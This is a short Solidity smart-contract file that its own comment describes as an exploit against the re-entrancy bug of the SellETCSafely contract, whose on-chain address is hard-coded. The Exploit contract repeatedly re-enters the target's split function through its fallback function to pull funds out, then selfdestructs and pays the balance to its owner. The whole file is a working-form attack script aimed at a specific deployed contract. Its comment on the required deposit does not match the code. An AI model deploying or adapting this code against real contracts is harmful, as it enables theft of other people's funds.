1 pragma solidity ^0.4.19;
2 
3 /*
4     This contract was written to exploit the SellETCSafely contract using its re-entrancy bug.
5     See: https://etherscan.io/address/0x5F0d0C4c159970fDa5ADc93a6b7F17706fd3255C.
6 */
7 
8 contract TargetContract {
9     function split(address ethDestination, address etcDestination) payable public;
10 }
11 
12 contract Exploit {
13     address public owner;
14     TargetContract targetContract = TargetContract(0x5F0d0C4c159970fDa5ADc93a6b7F17706fd3255C);
15     
16     function Exploit() public {
17         owner = msg.sender;
18     }
19     
20     function performReentrancyAttack() payable public {
21         // Perform a re-entrancy attack on the target contract.
22         
23         // We'll need at least a tenth of the target contact's balance to ensure that the recursion doesn't use up too much gas.
24         require(msg.value >= 0.1 ether);
25         
26         // Initiate the re-rentrancy.
27         targetContract.split.value(1)(msg.sender, msg.sender);
28     }
29     
30     function () payable public {
31         performReentrancyAttack();
32     }
33     
34     function kill() public {
35         // After using the contract, we'll destroy it.
36         require(owner == msg.sender);
37         selfdestruct(owner);
38     }
39 }